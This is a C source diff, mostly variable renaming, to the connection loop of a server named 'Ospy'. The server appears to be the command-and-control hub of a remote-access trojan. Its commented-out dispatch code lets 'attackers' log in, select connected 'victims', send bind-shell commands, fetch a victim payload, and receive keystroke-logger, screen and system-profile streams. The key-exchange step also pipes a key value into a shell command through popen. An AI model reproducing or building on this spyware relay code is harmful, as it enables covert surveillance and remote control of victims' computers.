@@ -3,29 +3,42 @@
 //#include "entering_to_Ospy.h"
 #include "server_connection.h"
 
+// global list
+client_ptr clients;
+
 int main (){
-	FILE * events_log = fopen("events_log.log", "a");
-	if (events_log == NULL)
+	FILE * fdEventsLog = fopen("fdEventsLog.log", "a");
+	if (fdEventsLog == NULL)
 		printf("Can't opening log file\n");
 	
-	time_t time_function = time(NULL);
-	char * curr_time;
-	curr_time = asctime(localtime(&time_function)); // time function
-	fprintf(events_log, "Ospy server started at : %s", curr_time);
-	fflush(events_log);
+	// Variable definition
 	
-	srand(time(0)); // make the random funtion real random
 	
-	initialize_connection(); 
+	// File definition
 	
-	int num_of_connected_clients = 0;
-	client_ptr curr_client; // poss of link list
 	
+	// Array definition
+	
+	
+	time_t     tmTimeFunction           = time(NULL);
+	char *     szCurrTime;
+	int        num_of_connected_clients = 0;
+	client_ptr clntpCurrClient; // poss of link list
+		
 //	encrypted_general_message_protocol message;
 	char message [100];
 //	registration_status registering_final_status;
 //	STATUS loging_in_status;
 //	licenses_key_item licenses_key;
+		
+	szCurrTime = asctime(localtime(&tmTimeFunction)); // time function
+	fprintf(fdEventsLog, "Ospy server started at : %s", szCurrTime);
+	fflush(fdEventsLog);
+	
+	srand(time(0)); // make the random funtion real random
+	
+	initialize_connection(); 
+	
 	
 	// KEY_EXCHANGE start to repalce
 	char temp_victim_public_key_name[25];
@@ -38,9 +51,10 @@ int main (){
 	// KEY_EXCHANGE start to repalce
 	
 	while(1) {
-		time_function = time(NULL);
-		curr_time = asctime(localtime(&time_function));	
-		strtok(curr_time, "\n");
+		tmTimeFunction = time(NULL);
+		szCurrTime = asctime(localtime(&tmTimeFunction));	
+		strtok(szCurrTime, "\n");
+		
 		//clear the socket set 
 		FD_ZERO(&readfds);
 		
@@ -53,43 +67,43 @@ int main (){
 		//wait for an activity on one of the sockets, timeout is NULL, so wait indefinitely 
 		activity = select( max_socket_descriptor + 1 , &readfds , NULL , NULL , NULL); 
 		if ((activity < 0) && (errno != EINTR)) 
-			fprintf(events_log, "%s : select error", curr_time);
-			fflush(events_log);
+			fprintf(fdEventsLog, "%s : select error", szCurrTime);
+			fflush(fdEventsLog);
 				
 		//If something happened on the master socket, then its an incoming connection 
 		if (FD_ISSET(master_socket, &readfds)) { 
 			if ((new_socket = accept(master_socket, (struct sockaddr *)&address, (socklen_t*)&addrlen)) < 0) { 
-				fprintf(events_log, "%s : accept error", curr_time);
-				fflush(events_log);
+				fprintf(fdEventsLog, "%s : accept error", szCurrTime);
+				fflush(fdEventsLog);
 				exit(EXIT_FAILURE);
 				
 			}
-			fprintf(events_log,"%s : New connection , socket fd is %d , ip is : %s , port : %d\n",curr_time, new_socket, inet_ntoa(address.sin_addr) , ntohs (address.sin_port));
-			fflush(events_log);
+			fprintf(fdEventsLog,"%s : New connection , socket fd is %d , ip is : %s , port : %d\n",szCurrTime, new_socket, inet_ntoa(address.sin_addr) , ntohs (address.sin_port));
+			fflush(fdEventsLog);
 			
 			//add new client to client link list
-			insert_client(2, new_socket, 0, "", "", &clients);
+			insert_client(2, new_socket, "", "", &clients);
 			num_of_connected_clients++;
 			print_clients_list(clients);
 			
-			fprintf(events_log, "%s : Adding to list of sockets as %d\n", curr_time, new_socket);
-			fflush(events_log);
+			fprintf(fdEventsLog, "%s : Adding to list of sockets as %d\n", szCurrTime, new_socket);
+			fflush(fdEventsLog);
 		}
 		
 		//else its some IO operation on some other socket 
 		for (int i = 0; i < num_of_connected_clients; i++){
-			if(curr_client == NULL)
-				curr_client = clients; // if way get to the end of the clients link list -> go to the head of the link list
+			if(clntpCurrClient == NULL)
+				clntpCurrClient = clients; // if way get to the end of the clients link list -> go to the head of the link list
 			
-			socket_descriptor = curr_client->socket_fd;
+			socket_descriptor = clntpCurrClient->fdSocket;
 			
 			if (FD_ISSET( socket_descriptor , &readfds)) {
 				//Check if it was for closing , and also read the incoming message
 				if (read(socket_descriptor, &message, sizeof(message)) == 0) { 
 					//Somebody disconnected , get his details and print
 					getpeername(socket_descriptor , (struct sockaddr*)&address ,(socklen_t*)&addrlen); 
-					fprintf(events_log,"%s : Host disconnected, ip %s , port %d \n",curr_time, inet_ntoa(address.sin_addr), ntohs(address.sin_port)); 
-					fflush(events_log);
+					fprintf(fdEventsLog,"%s : Host disconnected, ip %s , port %d \n",szCurrTime, inet_ntoa(address.sin_addr), ntohs(address.sin_port)); 
+					fflush(fdEventsLog);
 					
 					//Close the socket and mark as 0 in list for urses 
 					close(socket_descriptor);
@@ -102,18 +116,18 @@ int main (){
 //					if (message.i_am == ATTACKER){
 //						switch (message.action) {
 //							case LOG_IN :
-//								loging_in_status = log_in_attacker(decrypt_text(message.data.encrypted_login_to_Ospy.username, curr_client->encryption_key), decrypt_text(message.data.encrypted_login_to_Ospy.password, curr_client->encryption_key));
+//								loging_in_status = log_in_attacker(decrypt_text(message.data.encrypted_login_to_Ospy.username, clntpCurrClient->encryption_key), decrypt_text(message.data.encrypted_login_to_Ospy.password, clntpCurrClient->encryption_key));
 //								send(socket_descriptor, &loging_in_status, sizeof(registration_status), 0);
 //								if (loging_in_status == SUCCESS){// if attacker loged in -connect he's id the hes socket descriptor
-//									strcpy(curr_client->id, decrypt_text(message.data.encrypted_login_to_Ospy.username, curr_client->encryption_key)); // set attackers id = user name
-//									curr_client->i_am = ATTACKER; // declare this client as attacker
+//									strcpy(clntpCurrClient->id, decrypt_text(message.data.encrypted_login_to_Ospy.username, clntpCurrClient->encryption_key)); // set attackers id = user name
+//									clntpCurrClient->i_am = ATTACKER; // declare this client as attacker
 //									print_clients_list(clients);
 //								}
 //								
 //								break;
 //								
 //							case REGISTER :
-//								registering_final_status = register_new_attacker(message.data.encrypted_register_to_Ospay.license_key, decrypt_text(message.data.encrypted_register_to_Ospay.username, curr_client->encryption_key), decrypt_text(message.data.encrypted_register_to_Ospay.password, curr_client->encryption_key));
+//								registering_final_status = register_new_attacker(message.data.encrypted_register_to_Ospay.license_key, decrypt_text(message.data.encrypted_register_to_Ospay.username, clntpCurrClient->encryption_key), decrypt_text(message.data.encrypted_register_to_Ospay.password, clntpCurrClient->encryption_key));
 //								
 //								send(socket_descriptor, &registering_final_status, sizeof(registration_status),0);
 //								
@@ -126,33 +140,33 @@ int main (){
 //								break;
 //							
 //							case GET_CONNECTED_VICTM :
-//								send_to_attacker_connected_victims (curr_client, clients, num_of_connected_clients);
+//								send_to_attacker_connected_victims (clntpCurrClient, clients, num_of_connected_clients);
 //								
 //								break;
 //								
 //							case SELECT_VICTIM :
-//								set_attacker_victim_connection (&curr_client, &clients, num_of_connected_clients, message.data.selected_victim_name);
+//								set_attacker_victim_connection (&clntpCurrClient, &clients, num_of_connected_clients, message.data.selected_victim_name);
 //								print_clients_list(clients);
 //								break;
 //								
 //							case SEND_BIND_SHELL_COMMAND :
-//								send(curr_client->other_side_sfd, &message.action, sizeof(message.action), 0);
-//								send(curr_client->other_side_sfd, &message.data.bind_shell_command, sizeof(message.data.bind_shell_command), 0);
+//								send(clntpCurrClient->other_side_sfd, &message.action, sizeof(message.action), 0);
+//								send(clntpCurrClient->other_side_sfd, &message.data.bind_shell_command, sizeof(message.data.bind_shell_command), 0);
 //								
 //								break;
 //							
 //							case GET_VICTIM_PAYLOAD :
-//								send_payload_to_attacker(curr_client->socket_fd, curr_client->encryption_key);					
+//								send_payload_to_attacker(clntpCurrClient->socket_fd, clntpCurrClient->encryption_key);					
 //								
 //								break;
 //							
 //							case KEY_EXCHANGE :
-//								recv_attacker_aes_key(&curr_client, message.data.key_exchange_buffer);
+//								recv_attacker_aes_key(&clntpCurrClient, message.data.key_exchange_buffer);
 //								
 //								break ;
 //								
 //							default :
-//								send(curr_client->other_side_sfd, &message.action, sizeof(message.action), 0);
+//								send(clntpCurrClient->other_side_sfd, &message.action, sizeof(message.action), 0);
 //								
 //								break;	
 //						}
@@ -160,9 +174,9 @@ int main (){
 //					else if (message.i_am == VICTIM){
 //						switch (message.action){
 //							case LOG_IN :
-//								strcpy(curr_client->name, message.data.encrypted_login_vicim_to_Ospy.victim_name);
-//								strcpy(curr_client->id, message.data.encrypted_login_vicim_to_Ospy.id);
-//								curr_client->i_am = VICTIM;
+//								strcpy(clntpCurrClient->name, message.data.encrypted_login_vicim_to_Ospy.victim_name);
+//								strcpy(clntpCurrClient->id, message.data.encrypted_login_vicim_to_Ospy.id);
+//								clntpCurrClient->i_am = VICTIM;
 //								
 //								break;
 //								
@@ -171,25 +185,25 @@ int main (){
 //							case GET_SYSTEM_PROFILER :
 //							case GET_SCREEN_STREAM :
 //							case SEND_BIND_SHELL_COMMAND :
-//								send(curr_client->other_side_sfd, &message.data.file_data, sizeof(message.data.file_data), 0);
+//								send(clntpCurrClient->other_side_sfd, &message.data.file_data, sizeof(message.data.file_data), 0);
 //								
 //								break;
 //								
 //							case GET_KEYSTROKES_STREAM :
 //								//printf("\n%s",message.data.keylogger_stream_key);
-//								send(curr_client->other_side_sfd, message.data.keylogger_stream_key, sizeof(message.data.keylogger_stream_key), 0);
+//								send(clntpCurrClient->other_side_sfd, message.data.keylogger_stream_key, sizeof(message.data.keylogger_stream_key), 0);
 //								
 //								break;	
 //								
 //							case KEY_EXCHANGE :
 //								// save the victim's public rsa key to file
-//								sprintf(temp_victim_public_key_name, "%d_public_key.pem", curr_client->socket_fd);
+//								sprintf(temp_victim_public_key_name, "%d_public_key.pem", clntpCurrClient->socket_fd);
 //								victim_public_key_fd = fopen(temp_victim_public_key_name, "w");
 //								fputs(message.data.key_exchange_buffer, victim_public_key_fd);
 //								fclose(victim_public_key_fd);
 //								
 //								// encrypt the aes key with victim's public rsa key
-//								sprintf(rsa_encryption_of_aes_key_cmd, "echo %s | openssl rsautl -encrypt -inkey %s -pubin | openssl base64", curr_client->encryption_key, temp_victim_public_key_name);
+//								sprintf(rsa_encryption_of_aes_key_cmd, "echo %s | openssl rsautl -encrypt -inkey %s -pubin | openssl base64", clntpCurrClient->encryption_key, temp_victim_public_key_name);
 //								rsa_encrypted_aes_key = popen(rsa_encryption_of_aes_key_cmd, "r");
 //								while (fgets(sub_buffer, sizeof(sub_buffer), rsa_encrypted_aes_key) != NULL)
 //									strcat(key_exchange_buffer, sub_buffer);
@@ -211,9 +225,9 @@ int main (){
 //					}
 				} 
 			}
-			curr_client = curr_client->next_client;
+			clntpCurrClient = clntpCurrClient->clntNextClient;
 		} 
 	}
-	fclose(events_log);
+	fclose(fdEventsLog);
 	return 0; 
 }
